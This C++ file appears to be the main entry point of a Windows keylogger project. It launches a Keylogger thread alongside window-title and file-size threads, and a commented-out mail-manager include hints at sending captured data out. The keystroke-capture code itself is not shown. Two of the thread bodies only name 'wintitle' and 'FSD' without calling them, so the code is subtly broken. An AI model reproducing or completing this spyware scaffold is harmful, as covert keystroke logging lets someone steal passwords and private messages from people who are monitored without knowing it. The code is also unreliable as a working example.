#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
#include "KeyLogger.h"
using namespace std;
mutex mtx;
int main()
{
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule != nullptr) {
    // Keylogger(NULL);
    auto main = []() {
        //mtx.lock();
        printf("main start!\n");
        Keylogger(NULL);
        printf("main end!\n");
       // mtx.unlock();
    };
    auto title = []() {
       // mtx.lock();
        printf("win start!\n");
        wintitle;
        printf("wintitle end!\n");
        //mtx.unlock();
    };
    auto filesize = []() {
        //mtx.lock();
        printf("fsd start!\n");
        FSD;
        printf("fsd end!\n");
       // mtx.unlock();
    };

    thread t1 = thread(main);
    thread t2 = thread(title);
    thread t3 = thread(filesize);

    t1.join();
    t2.join();
    t3.join();
    }
    return 0;
    /* thread mainThread = thread(Keylogger(NULL), 1, 5);
    thread titleThread = thread(wintitle, 2, 6);
    thread filesizeThread = thread(FSD, 3, 7);

    mainThread.join();
    titleThread.join();
    filesizeThread.join();
    */
}